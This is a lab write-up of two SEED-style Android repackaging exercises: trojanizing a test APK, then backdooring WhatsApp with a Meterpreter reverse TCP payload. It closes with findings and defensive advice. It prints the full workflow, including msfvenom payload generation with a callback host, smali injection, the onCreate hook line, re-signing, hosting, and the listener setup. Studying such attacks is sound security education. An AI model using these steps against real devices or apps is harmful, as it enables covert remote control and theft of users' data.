Overview

Lab Overview

This two-part lab explored Android repackaging attacks — one of the most prevalent threat vectors in mobile security. The attack technique involves decompiling a legitimate Android application, injecting malicious code, recompiling it, and redistributing it as a trojanized version of the original app.

Lab 1 used a simple test application (RepackagingLab.apk) to establish the foundational repackaging workflow. Lab 2 escalated the complexity by repackaging a real-world application — WhatsApp — with a Meterpreter reverse TCP backdoor, enabling full remote access to a compromised Android device.

L1

RepackagingLab.apk — SEED Lab

  • Decompiled APK using apktool
  • Injected MaliciousCode.smali into app package
  • Modified AndroidManifest.xml for permissions & boot persistence
  • Recompiled, signed, and deployed trojanized app
L2

WhatsApp — Meterpreter Backdoor

  • Generated backdoor.apk payload with msfvenom
  • Decompiled both WhatsApp and backdoor APKs
  • Injected Meterpreter payload smali into WhatsApp
  • Signed app, deployed via Apache, established C2 session

Methodology

Methodology

Lab 1 — Repackaging a Test Application

The first lab used the SEED Labs RepackagingLab.apk as a safe target to practice the core workflow. apktool decompiled the APK into its component files, exposing the AndroidManifest.xml and smali source directories. The malicious MaliciousCode.smali file was copied into the app's smali package directory, and the manifest was modified to grant contact read/write permissions and register a broadcast receiver to trigger the payload on device boot.

Lab 1 — Decompile, Inject & Recompile

# Decompile the target app sudo apktool d RepackagingLab.apk # Copy malicious smali into the app package sudo cp MaliciousCode.smali RepackagingLab/smali/com/ # Recompile the modified app sudo apktool b RepackagingLab

The AndroidManifest.xml was edited to add three permissions and register a broadcast receiver — allowing the payload to silently access device contacts and persist across reboots.

Lab 2 — Backdooring WhatsApp with Meterpreter

The second lab significantly escalated complexity. A Meterpreter reverse TCP payload was first generated as a standalone backdoor.apk using msfvenom. Both WhatsApp and the backdoor were decompiled, and the Meterpreter payload smali files were extracted from the backdoor and injected into WhatsApp's package structure.

Lab 2 — Payload Generation & APK Decompilation

# Generate Meterpreter reverse TCP payload as an APK msfvenom -p android/meterpreter/reverse_tcp \ LHOST=192.168.150.175 LPORT=5555 R > backdoor.apk # Decompile both apps sudo apktool d -f -o original whatsapp.apk sudo apktool d -f -o payload backdoor.apk # Create the payload directory structure inside WhatsApp sudo mkdir -p original/smali/com/metasploit/stage # Copy Meterpreter smali files into WhatsApp sudo cp -r payload/smali/com/metasploit/stage/* \ original/smali/com/metasploit/stage/

The critical step was editing WhatsApp's Main.smali file to invoke the payload on app launch. A single line was inserted below the onCreate hook to call the Meterpreter stage's start method — ensuring the backdoor activates every time WhatsApp opens, invisible to the user.

Main.smali — Payload Invocation Hook

# Inserted below the onCreate method hook (~line 662) invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

Signing & Deployment

Android requires all APKs to be signed before installation. A self-signed keystore was generated with keytool, and the repackaged WhatsApp was signed with jarsigner. The signed APK was then hosted on an Apache web server running on Kali Linux, downloaded to the Android VM, and installed by the victim.

Signing the Repackaged APK

# Generate a signing keystore sudo keytool -alias backdoorkey -genkey -v \ -keystore backdoorkey.keystore \ -keyalg RSA -keysize 2048 -validity 10000 # Sign the repackaged WhatsApp APK sudo jarsigner -verbose -sigalg SHA1withRSA \ -digestalg SHA1 -keystore backdoorkey.keystore \ whatsapp.apk backdoorkey # Host on Apache and set up Metasploit listener sudo cp backdoor.apk /var/www/html sudo service apache2 start msfconsole → use exploit/multi/handler → set payload android/meterpreter/reverse_tcp

Findings

Key Findings

Finding 1 — APK Signing Does Not Prevent Repackaging

Android's code signing model verifies that an app hasn't been tampered with after signing, but does not prevent an attacker from stripping the original signature, modifying the app, and re-signing it with their own key. Users have no reliable way to detect this unless comparing certificate fingerprints.

Finding 2 — Manifest Permissions Enable Silent Surveillance

By adding READ_CONTACTS, WRITE_CONTACTS, and RECEIVE_BOOT_COMPLETED permissions to the manifest, the malicious app gained persistent access to sensitive device data. The contacts dump via Meterpreter's dump_contacts command confirmed full exfiltration capability.

Finding 3 — Third-Party APK Sources Are High Risk

The attack was only possible because "install from unknown sources" was enabled on the Android VM. This underscores the risk of sideloading APKs outside of the official Google Play Store, which performs code signing verification and malware scanning on submitted apps.

Finding 4 — Full Device Compromise via Meterpreter

After the backdoored WhatsApp was opened, a Meterpreter session was established immediately. Post-exploitation capabilities included live screen streaming, contact dumping, and arbitrary command execution — all running silently in the background while WhatsApp appeared to function normally.

Takeaways

Lessons & Takeaways

This lab provided deep, hands-on insight into why Android repackaging attacks remain one of the most effective mobile threat vectors. The attack requires no zero-day exploits, no sophisticated vulnerability research — just access to a legitimate APK and basic tooling. The barrier to entry is low, making it a common technique used by threat actors distributing malware through unofficial app stores.

From a defensive standpoint, organizations and users should enforce app installation only from trusted sources, implement mobile device management (MDM) solutions that verify app signatures, and train users to scrutinize app permissions at install time — particularly when permissions seem excessive for the app's stated purpose.
